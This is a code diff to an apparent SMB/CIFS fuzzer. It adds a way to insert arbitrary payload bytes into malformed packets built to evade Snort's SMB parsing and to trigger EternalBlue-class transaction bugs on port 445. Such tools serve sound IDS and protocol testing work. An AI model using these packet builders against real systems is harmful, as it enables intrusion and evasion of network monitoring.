@@ -398,7 +398,7 @@ def _build_wordcount_bytecount_desync():
         return pre + _wrap(hdr + body), _CIFS_PORT_445
 
 
-def _build_andx_chain_abuse():
+def _build_andx_chain_abuse(payload_override=None):
     """Strategy 4: AndX chaining abuse.
 
     Targets Snort 133:20 (excessive chaining) and 133:21 (multiple chained login).
@@ -411,6 +411,20 @@ def _build_andx_chain_abuse():
     - nested_tree_connect: deeply nested TREE_CONNECT chains
     - andx_to_non_andx: chain to a non-AndX command
     """
+    if payload_override is not None:
+        pre = _negotiate_msg()
+        hdr = _smb1_header(SMB_COM_WRITE_ANDX, tid=1, uid=1, mid=1)
+        words = struct.pack("<BBH", ANDX_NONE, 0, 0)
+        words += struct.pack("<H", 0xFFFF)  # FID
+        words += struct.pack("<I", 0)       # Offset
+        words += struct.pack("<I", 0)       # Timeout
+        words += struct.pack("<H", 0)       # WriteMode
+        words += struct.pack("<H", 0)       # Remaining
+        words += struct.pack("<HH", 0, len(payload_override))  # DataLenHigh, DataLen
+        words += struct.pack("<H", 64)      # DataOffset
+        words += struct.pack("<I", 0)       # OffsetHigh
+        body = struct.pack("<B", 14) + words + struct.pack("<H", len(payload_override)) + payload_override
+        return pre + _wrap(hdr + body), _CIFS_PORT_445
     variant = random.choice([
         "excessive_chain", "circular_chain", "invalid_offset",
         "chained_login_logoff", "nested_tree_connect", "andx_to_non_andx",
@@ -511,7 +525,7 @@ def _build_andx_chain_abuse():
         return pre + _wrap(hdr + body), _CIFS_PORT_445
 
 
-def _build_transaction_fragmentation():
+def _build_transaction_fragmentation(payload_override=None):
     """Strategy 5: Transaction sub-protocol fragmentation attacks.
 
     Targets EternalBlue-class bugs (CVE-2017-0144, CVE-2017-0145).
@@ -524,6 +538,22 @@ def _build_transaction_fragmentation():
     - secondary_without_primary: send TRANSACTION2_SECONDARY without primary
     - overlapping_fragments: overlapping data offsets in fragments
     """
+    if payload_override is not None:
+        pre = _negotiate_msg()
+        hdr = _smb1_header(SMB_COM_TRANSACTION, tid=1, uid=1, mid=1)
+        name = b"\\PIPE\\LANMAN\x00"
+        setup = struct.pack("<H", 0x0068)
+        words = struct.pack("<H", len(payload_override))  # TotalParamCount
+        words += struct.pack("<H", len(payload_override))  # TotalDataCount
+        words += struct.pack("<H", 0xFFFF) + struct.pack("<H", 0xFFFF)
+        words += struct.pack("<B", 0) + b'\x00'
+        words += struct.pack("<H", 0) + struct.pack("<I", 0) + struct.pack("<H", 0)
+        words += struct.pack("<H", len(payload_override)) + struct.pack("<H", 100)
+        words += struct.pack("<H", len(payload_override)) + struct.pack("<H", 120)
+        words += struct.pack("<B", 1) + b'\x00' + setup
+        data_block = name + payload_override + payload_override
+        body = struct.pack("<B", 14 + 1) + words + struct.pack("<H", len(data_block)) + data_block
+        return pre + _wrap(hdr + body), _CIFS_PORT_445
     variant = random.choice([
         "oversized_total", "mismatched_fragments", "nttrans_32bit_overflow",
         "zero_setup_count", "secondary_without_primary", "overlapping_fragments",
@@ -1296,7 +1326,7 @@ def _build_deprecated_command_abuse():
         return pre + _wrap(hdr + body), _CIFS_PORT_445
 
 
-def _build_tcp_segmentation_evasion():
+def _build_tcp_segmentation_evasion(payload_override=None):
     """Strategy 14: TCP-layer attacks against CIFS/SMB parsers.
 
     Targets Snort dce_smb TCP stream reassembly.
@@ -1309,6 +1339,11 @@ def _build_tcp_segmentation_evasion():
     - partial_delivery: truncate mid-message
     - interleaved_sessions: mix bytes from different sessions
     """
+    if payload_override is not None:
+        hdr = _smb1_header(SMB_COM_NEGOTIATE)
+        data_block = b'\x02' + payload_override + b'\x00'
+        body = struct.pack("<B", 0) + struct.pack("<H", len(data_block)) + data_block
+        return _wrap(hdr + body), _CIFS_PORT_445
     variant = random.choice([
         "split_nbt_header", "split_smb_header", "header_body_split",
         "single_byte_segments", "partial_delivery", "interleaved_sessions",
@@ -1362,12 +1397,19 @@ _BUILDERS = {
 }
 
 
-def build_cifs_payload(strategy: str):
+_CIFS_OVERRIDE_CAPABLE = frozenset([
+    "andx_chain_abuse", "transaction_fragmentation", "tcp_segmentation_evasion",
+])
+
+def build_cifs_payload(strategy: str, payload_override=None):
     """Return (payload_bytes, dst_port) for the given strategy."""
     builder = _BUILDERS.get(strategy)
     if builder is None:
         builder = _build_dialect_negotiation
-    payload, dst_port = builder()
+    if payload_override is not None and strategy in _CIFS_OVERRIDE_CAPABLE:
+        payload, dst_port = builder(payload_override=payload_override)
+    else:
+        payload, dst_port = builder()
     return _clamp(payload), dst_port
 
 
@@ -1385,11 +1427,11 @@ class CifsMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return CIFS_WEIGHTS
 
-    def mutate(self):
+    def mutate(self, payload_override=None):
         """Returns (payload_bytes, strategy_name, dst_port)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload, dst_port = build_cifs_payload(strategy)
+        payload, dst_port = build_cifs_payload(strategy, payload_override=payload_override)
         return payload, strategy, dst_port
